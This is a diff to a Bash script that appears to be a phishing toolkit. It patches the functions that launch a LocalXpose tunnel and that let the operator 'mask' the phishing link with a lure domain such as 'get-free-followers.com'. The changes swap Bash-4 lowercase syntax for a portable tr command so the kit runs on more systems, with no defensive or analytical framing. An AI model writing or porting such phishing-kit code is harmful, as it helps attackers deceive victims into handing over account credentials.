@@ -493,7 +493,8 @@ start_loclx() {
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+## this is the original line	[[ ${opinion,,} == "y" ]] 
+	[[ $(echo "$opinion" | tr '[:upper:]' '[:lower:]') == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
@@ -549,7 +550,8 @@ custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
-	if [[ ${mask_op,,} == "y" ]]; then
+##this line was commented and replaced witht he line below	if [[ ${mask_op,,} == "y" ]]; then
+		if [[ $(echo "$mask_op" | tr '[:upper:]' '[:lower:]') == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
